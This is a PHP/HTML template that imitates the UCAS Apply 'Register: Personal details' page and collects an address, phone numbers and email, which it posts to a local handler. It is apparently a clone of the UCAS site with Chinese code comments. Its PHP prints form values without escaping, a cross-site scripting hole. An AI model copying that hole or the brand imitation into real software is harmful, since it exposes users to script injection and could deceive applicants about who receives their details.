<?php include_once "top.php";?>
<body bgcolor="#ffffff" text="#000000" link="#e31c18" vlink="#e31c18" alink="#e31c18">
<div id="outerWrapper" class="clearfix"><!-- Outer  Wrapper starts here-->
    <div id="wrapperInternal" class="floatLeft"><!-- Wrapper Internal starts here-->
        <!--header starts here-->
        <div id="header">
            <div id="tools">
                <ul>
                    <li><a href="https://www.ucas.com/corporate/about-us/contact-us" onclick="window.open(this.href);return false;">Contact us</a> |</li>
                    <li class="help"><a href="#" onclick="helpOpen('PopUpServlet;jsessionid=3acb7bb26c76eb3635cf937682c5', '?functionname=help&amp;lang=1&amp;page=HELP.HEADER.PAGE'); return false;">Help</a> |</li>
                    <li><a href="javascript:onclick=window.print()">Print page</a></li>
                    <li>&nbsp;</li>
                    <li>&nbsp;</li>
                    <li>&nbsp;</li>
                </ul>
            </div><!--tools ENDS here-->
            <div id="logo" class="floatLeft">
                <a href="#"><img src="/static/picture/apply_logo.gif" width="91" height="30" alt="UCAS" /></a>
            </div><!--logo ENDS here-->
            <div class="clearDiv">&nbsp;</div>
            <div id="strapLineApply">
                <h1 class="EN">Register: Personal details</h1>
            </div><!--strapLineApply ENDS here-->
            <!--This 3 lines of code target the printed page only-->  <div id="strapLineApplyPrint">  <img src="/static/picture/apply_interactive_pagehead_print.jpg" alt="apply" />  </div><!--StrapLinePrint ENDS here--></div><!--header ENDS here-->

        <!--header ends here-->
        <div class="clearDiv">&nbsp;</div>
        <!-- Form starts here -->
        <form name="Form1" action="register5" method="post" autocomplete="off">
            <!-- main content starts here -->
            <div id="mainContent">
                <!--menu starts-->
                <div id="leftNavInternal" class="floatLeft">
                    <ul>
                        <li><a href="#" onclick="helpOpen('PopUpServlet', '?functionname=help&amp;lang=1&amp;page=HELP.LOGIN.WHATISAPPLY.FIELD'); return false;">What is Apply?</a></li>
                        <li><a href="#" onclick="javascript:if(window.launchPageHelp){launchPageHelp();}else{alert('Help has not been set up for this page');}; return false;">Help</a></li>
                        <li class="last"><a href="ServicesServlet?functionname=registeroptions&amp;id=cbf560f6369164a30e079b45d585&amp;ran=1kma4oqv2h5u0">Options/Opsiynau</a></li>
                    </ul><h3>Key</h3>
                    <ul id="key">
                        <li style="display: none;" id="subCharacter">European characters allowed</li>
                        <li id="help" class="last">Help</li>
                    </ul><!--key ENDS here-->
                </div>
                <!--leftNav ENDS here-->
                <!--menu ends-->
                <!-- gatewayContent starts here -->




                <div id="gatewayContent">
                    <div id="breadcrumb">
                        <a href="/user/register">Home</a> &gt;
                        Register
                    </div>
                    <!--breadcrumb ends here-->

                    <!-- progressBar div starts here -->

                    <!-- progressBar div starts here -->
                    <div id="progressBar">
                        <ul>
                            <li class="done">&nbsp;</li>
                            <li class="done">&nbsp;</li>
                            <li class="done">&nbsp;</li>
                            <li class="done">&nbsp;</li>
                            <li class="done">&nbsp;</li>
                            <li class="done">&nbsp;</li>
                            <li class="done">&nbsp;</li>
                            <li class="on">&nbsp;</li>
                            <li>&nbsp;</li>
                            <li class="last">&nbsp;</li>
                        </ul>
                        <span id="progressBarLabel">Progress</span>
                    </div><!--progressBar ends here-->
                    <!--progressBar ends here-->

                    <!-- midBoxInternalWide starts here -->
                    <div id="midBoxInternalWide">

                        <!-- Form starts here -->
                        <form name="Form1" action="SecurityServlet" method="post" autocomplete="off">

                            <!--Form style starts here-->
                            <div class="thisForm">

                                <!-- Main area of page provided here by a servlet clip -->
                                <p><input type="hidden" name="from" value="12"></p><p><input type="hidden" name="functionname" value="register"></p><input type="hidden" name="hidCharWarningMsg" value="The following character is not permitted here " id="hidCharWarningMsg">
                                <input type="hidden" name="unplacedCommsCheckBox" value="checked">
                                <input type="hidden" name="commercialMailingsCheckBox" value="">
                                <input type="hidden" name="educationalMailingsCheckBox" value="">
                                <input type="hidden" name="emailCheckBox" value="">
                                <input type="hidden" name="textCheckBox" value="">
                                <input type="hidden" name="noPostCheckBox" value="">
                                <p class="bold">Compulsory fields are marked with an asterisk (<span class="Req">*</span>).</p><div style="display: none;" id="unicodeMsgWarning">
                                    <span class="warningTxt">Warning:  You have entered some European characters that are not in the English alphabet. Not all universities and colleges can view these characters correctly, so a version with substituted English characters is also made available to them. Fields that allow European characters are marked with an '<span class="ReqPlus">?</span>'. <a href="https://www.ucas.com/sites/default/files/extended-character-sets-substitutions_0.pdf" target="_blank">View the list of European characters we allow.</a></span><br><br>
                                </div>
                                <div class="errorTxt"></div>
                                <!--Address summary -->
                                <!--Address Line 1 -->
                                <div class="thisFormElem">
                                    <!--open form element -->
                                    <div class="thisFormTxt">
                                        <label for="address">Postal address<span class="Req">*</span></label>
                                    </div>
                                    <div class="thisFormTxt">
                                        <?= $form_data['addrLine1Text'] ?? '' ?>
                                    </div>
                                    <!--Address Line 2 -->
                                    <div class="thisFormTxt">
                                        <label>&nbsp;</label>
                                    </div>
                                    <div class="thisFormTxt">
                                        <?= $form_data['addrLine2Text'] ?? '' ?>
                                    </div>
                                    <!--Address Line 3 -->
                                    <div class="thisFormTxt">
                                        <label>&nbsp;</label>
                                    </div>
                                    <div class="thisFormTxt">
                                        <?= $form_data['addrLine3Text'] ?? '' ?>
                                    </div>
                                    <!--Address Line 4 -->
                                    <div class="thisFormTxt">
                                        <label>&nbsp;</label>
                                    </div>
                                    <div class="thisFormTxt">
                                        <?= $form_data['addrLine4Text'] ?? '' ?>
                                    </div>
                                    <!--Postal Country -->
                                    <div class="thisFormTxt">
                                        <label>&nbsp;</label>
                                    </div>
                                    <div class="thisFormTxt">
                                        <?= $form_data['Country'] ?? '' ?>
                                    </div>
                                </div><!--close form element -->
                                <p><input type="hidden" name="from" value="aa111" id="address1"></p><p><input type="hidden" name="from" value="bb" id="address2"></p><p><input type="hidden" name="from" value="cc" id="address3"></p><p><input type="hidden" name="from" value="dd" id="address4"></p><input type="hidden" name="btnNext" value="dummy next button" style="position : absolute; top : -1000px; left : -1000px;">
                                <!--Change address button -->
                                <div class="thisFormElem">
                                    <!--open form element -->
                                    <div class="thisFormTxt">
                                        <label>&nbsp;</label>
                                    </div>
                                    <div class="thisFormField">
                                        <input type="button" name="btnChangeAddress" value="change address" class="floatLeft seeListBtn">

                                        <a href="#" onclick="helpOpen('HelpServicesServlet', '?functionname=help&amp;page=HELP.REGISTRATION.CONTACTDETAILS.FIELD.ADDRESS'); return false;"><img src="/static/images/questMarkBox.gif" width="20" height="20" class="floatLeft" alt="Help"></a>
                                    </div>
                                </div><!--close form element -->
                                <!--Home Telephone Number -->
                                <div class="thisFormElem">
                                    <!--open form element -->
                                    <div class="thisFormTxt">
                                        <label for="homePhoneText">Home telephone number</label>
                                        <span class="Req">*</span>
                                    </div>
                                    <div class="thisFormField">
                                        <input type="text" name="txtHomePhone" value="<?= $form_data['txtHomePhone'] ?? ''?>" size="24" maxlength="24" class="floatLeft" id="txtHomePhone">
                                        <a href="#" onclick="helpOpen('HelpServicesServlet', '?functionname=help&amp;page=HELP.REGISTRATION.CONTACTDETAILS.FIELD.TELNO'); return false;"><img src="/static/images/questMarkBox.gif" width="20" height="20" class="floatLeft" alt="Help"></a>
                                    </div>
                                </div><!--close form element -->
                                <!--Mobile Telephone Number -->
                                <div class="thisFormElem">
                                    <!--open form element -->
                                    <div class="thisFormTxt">
                                        <label for="mobilePhoneText">Mobile number</label>
                                        <span class="Req">*</span>
                                    </div>
                                    <div class="thisFormField">
                                        <input type="text" name="txtMobilePhone" value="<?= $form_data['txtMobilePhone'] ?? ''?>" size="24" maxlength="24" class="floatLeft" id="txtMobilePhone">
                                        <a href="#" onclick="helpOpen('HelpServicesServlet', '?functionname=help&amp;page=HELP.REGISTRATION.CONTACTDETAILS.FIELD.MOBILE'); return false;"><img src="/static/images/questMarkBox.gif" width="20" height="20" class="floatLeft" alt="Help"></a>
                                    </div>
                                </div><!--close form element -->
                                <!--email -->
                                <div class="thisFormElem">
                                    <!--open form element -->
                                    <div class="thisFormTxt">
                                        <label for="emailText">Email address<span class="Req">*</span></label>
                                    </div>
                                    <div class="thisFormField">
                                        <input type="text" name="emailText" value="<?= $form_data['emailText'] ?? ''?>" size="35" maxlength="60" class="floatLeft" id="emailText">
                                        <a href="#" onclick="helpOpen('HelpServicesServlet', '?functionname=help&amp;page=HELP.REGISTRATION.CONTACTDETAILS.FIELD.EMAIL'); return false;"><img src="/static/images/questMarkBox.gif" width="20" height="20" class="floatLeft" alt="Help"></a>
                                    </div>
                                </div><!--close form element -->
                                <!--email confirm-->
                                <div class="thisFormElem">
                                    <!--open form element -->
                                    <div class="thisFormTxt">
                                        <label for="emailConfirmText">Confirm email address<span class="Req">*</span></label>
                                    </div>
                                    <div class="thisFormField">
                                        <input type="text" name="emailConfirmText" value="<?= $form_data['emailText'] ?? ''?>" size="35" maxlength="60" class="floatLeft" id="emailConfirmText">
                                        <a href="#" onclick="helpOpen('HelpServicesServlet', '?functionname=help&amp;page=HELP.REGISTRATION.CONTACTDETAILS.FIELD.EMAILCONFIRM'); return false;"><img src="/static/images/questMarkBox.gif" width="20" height="20" class="floatLeft" alt="Help"></a>
                                    </div>
                                </div><!--close form element -->
                                <div class="clearDiv">&nbsp;</div>
                                <hr>
                                <h2 class="inPage">Keep up-to date with your application</h2>
                                <p>To make sure you've got everything you need for your journey to higher education, we'll ask you to tell us how you'd like to get your updates.<br><br>We'll keep you updated on the progress of your application — from deadline reminders to Track updates — by email and post.</p>
                                <div class="clearDiv">&nbsp;</div>
                                <h2 class="inPage">We won't pass on your details...</h2>
                                <p>We'll keep your data safe, and won't pass it on to third parties, but you can update your preferences at any time in the 'Your details' section of Track. For more information, take a look at our <a href="https://www.ucas.com/corporate/about-us/privacy-policies-and-declarations/ucas-privacy-policy" target="_blank">privacy policy</a>.</p>


                                <!-- Previous and Next  Buttons starts here -->
                                <div class="thisFormElem">
                                    <div class="thisFormTxt">
                                        <label>&nbsp;</label>
                                    </div>
                                    <div class="thisFormField">
                                        <a href="register4">
                                            <input type="button" name="btnPrevious" value="previous"  class="submitBtn">
                                        </a>

                                        &nbsp;&nbsp;<input type="button" name="btnNext" value="next" onclick="check()" class="submitBtn">
                                    </div>
                                </div>
                                <!-- Previous and Next  Buttons ends here-->

                            </div>
                            <!-- ME110::Marketing preference Modal starts here -->
                            <div id="marketPref">




                            </div>
                            <!-- ME110::Marketing preference Modal Ends here -->
                            <!--Form style ends here-->
                        </form>
                        <!--Form ends here-->

                        <div class="clearDiv">&nbsp;</div>
                    </div>
                    <!--midBoxInternalWide ends here-->

                    <div class="clearDiv">&nbsp;</div>
                </div>


                <!--gateway content ends here-->
            </div>
            <!--maincontent ends here-->
            <div class="clearDiv">&nbsp;</div>
            <!-- temporary position/style -->

        </form><!-- Form ends here -->
        <!-- 底部start  -->
        <?php include_once "buttom.php"; ?>
        <!-- 底部end  -->
        <div class="clearDiv">&nbsp;</div>
    </div> <!--wrapper internal ends here-->
</div><!--outer wrapper ends here-->
<input type="hidden" name="hidCharWarningMsg" id = "hidCharWarningMsgPassword" value="You cannot have a space in your password"/>


<div id="backgroundPopup"></div>












<div id="simplemodal-overlay" class="simplemodal-overlay" style="opacity: 0.5; height: 100%; width: 100%; position: fixed; left: 0px; top: 0px; z-index: 1001; display: none;"></div>
<div id="confirm-container" class="simplemodal-container" style="position: fixed; z-index: 1002; height: auto; width: 480px; left: 35%; top: 2%; display: none;">
    <a class="modalCloseImg simplemodal-close" title="Close"></a>
    <div tabindex="-1" class="simplemodal-wrap" style="height: 100%; outline: 0px; width: 100%; overflow: auto;">
        <div id="marketPref" class="simplemodal-data" style="display: block;">
            <div class="message">
                <div class="thisForm">
                    <h2 class="inPage">Everything you need to know</h2>
                    <div class="clearDiv">&nbsp;</div>
                    <br>
                    <div class="thisFormElem">
                        <div class="checkboxes">
                            <label for="chkAllComms">
                                <input type="checkbox" name="chkAllComms" id="chkAllCommsFlag" class="chkAllCommsFlag" style="display: none;"><span class="chkAllCommsFlag tzCheckBox " name="chkAllComms"><span class="tzCBContent"></span><span class="tzCBPart"></span></span>
                                <span class="bold">&nbsp;&nbsp;Get updates on everything - stay in the know</span>
                            </label>
                        </div>
                    </div>
                    <div style="padding-left: 14%;">
                        <div class="thisFormElem">
                            <div class="thisFormElem">
                                <div class="thisFormTxt">
                                    <input type="checkbox" id="chkEducationalOption" name="chkEducationalOption" class="checkSingleComms" style="display: none;">
                                    <span class="checkSingleComms tzCheckBox " name="chkEducationalOption">
                                        <span class="tzCBContent"></span>
                                        <span class="tzCBPart"></span>
                                    </span>
                                </div>
                                <div class="thisFormField">
                                    <label class="bold" for="chkEducationalOption">Your options</label>
                                    <p>Hear from unis, colleges, and employers about all your options —  including courses relevant to you, open days, apprenticeship opportunities, and studying abroad.</p>
                                </div>
                            </div>
                            <div class="thisFormElem">
                                <div class="thisFormTxt">
                                    <input type="checkbox" id="chkCommercialOption" name="chkCommercialOption" class="checkSingleComms" style="display: none;">
                                    <span class="checkSingleComms tzCheckBox " name="chkCommercialOption">
                                        <span class="tzCBContent"></span><span class="tzCBPart">

                                        </span>
                                    </span>
                                </div>
                                <div class="thisFormField">
                                    <label class="bold" for="chkCommercialOption">Student essentials</label>
                                    <p>Make the most of student life with info on tech, retailers, publications, banks, travel, and transport, as well as recommendations for student accommodation.</p>
                                </div>
                            </div>
                            <div class="thisFormElem">
                                <div class="thisFormTxt">
                                    <input type="checkbox" name="chkUnplacedCommsFlag" class="checkSingleComms" checked="" style="display: none;">
                                    <span class="checkSingleComms tzCheckBox" name="chkUnplacedCommsFlag">
                                        <span class="tzCBContent"></span>
                                        <span class="tzCBPart"></span>
                                    </span>
                                </div>
                                <div class="thisFormField">
                                    <label class="bold" for="chkUnplacedCommsFlag">Relevant courses</label>
                                    <p>If you find yourself without a place, we'll share course info from unis and colleges that have vacancies on relevant courses.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="thisFormElem" id="contactOption" disabled="disabled">
                        <div class="clearDiv">&nbsp;</div>
                        <hr>
                        <h2 class="inPage">How we contact you</h2>
                        <p id="optionWarningTxt" class="warningTxt" style="visibility: hidden;">Please select a channel</p>
                        <div class="thisFormElem">
                            <div class="checkboxes">
                                <label for="chkAll">
                                    <input type="checkbox" id="chkAllOption" name="chkAll" class="chkAllOption" disabled="" style="display: none;">
                                    <span class="chkAllOption tzCheckBox " name="chkAll"><span class="tzCBContent"></span>
                                        <span class="tzCBPart"></span>
                                    </span><span>&nbsp;&nbsp;All channels&nbsp;
                                    </span>
                                </label>
                            </div>
                            <div style="padding-left: 14%;">
                                <div class="thisFormElem">
                                    <label for="chkEmailOption">
                                        <input type="checkbox" name="chkEmailOption" class="checkSingleOption" style="display: none;">
                                        <span class="checkSingleOption tzCheckBox checked " name="chkEmailOption">
                                            <span class="tzCBContent"></span>
                                            <span class="tzCBPart"></span></span>
                                        <span>&nbsp;&nbsp;Email&nbsp;&nbsp;
					</span>
                                    </label>
                                    <label for="chkTxtOption">
                                        <input type="checkbox" name="chkTxtOption" class="checkSingleOption" disabled="" style="display: none;"><span class="checkSingleOption tzCheckBox " name="chkTxtOption"><span class="tzCBContent"></span><span class="tzCBPart"></span></span><span>&nbsp;&nbsp;Text/SMS&nbsp;&nbsp;
					</span>
                                    </label>
                                    <label for="chkMailingsOption">
                                        <input type="checkbox" name="chkMailingsOption" class="checkSingleOption" disabled="" style="display: none;"><span class="checkSingleOption tzCheckBox " name="chkMailingsOption"><span class="tzCBContent"></span><span class="tzCBPart"></span></span><span>&nbsp;&nbsp;Post</span>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="thisFormElem">

                <div class="buttons">
                    <div id="save" >
                        save
                    </div>
                    <div id="close" >
                        close
                    </div>
                </div>
            </div>
        </div></div>
</div>
</body>
</html>
<script type="text/javascript">
    function check() {


        var emailText= $("#emailText").val(); //电邮地址
        var emailConfirmText= $("#emailConfirmText").val(); // 确认电子邮件地址
        var txtHomePhone= $("#txtHomePhone").val(); // 手机号
        var txtMobilePhone= $("#txtMobilePhone").val(); // 电话
        var myReg=/^[a-zA-Z0-9_-]+@([a-zA-Z0-9]+\.)+(com|cn|net|org)$/;

        err = '<p>Some of the information you have provided is incorrect. Please check the details.</p>';
        if(emailText == ''){
            err += '<p>You must provide a valid email address.</p>';
        }

       else if(emailConfirmText == '' || emailText != emailConfirmText){
            err += '<p>The email addresses you have entered do not match.</p>';
        }

        else if(!myReg.test(emailText) || !myReg.test(emailConfirmText)){
            err += '<p>Your email address does not appear to have the correct format.</p>';
            err += '<p>The email addresses you have entered do not match.</p>';
        }
        else if (txtHomePhone == '' || txtMobilePhone == '') {
            err += '<p>Please enter your full mobile or cell phone number, if any, including the area or international code(s).</p>';
        }
        else {

            $('#simplemodal-overlay').show();
            $('#confirm-container').show();
        }
        $('.errorTxt').html(err);
        scrollTo(0,0);

    }

    // 关闭窗口
    $('#close').click(function () {
        $('#simplemodal-overlay').hide();
        $('#confirm-container').hide();
    })

    // 提交
    $('#save').click(function () {
        $('form').submit()
            // window.location="register6"
    })

</script>
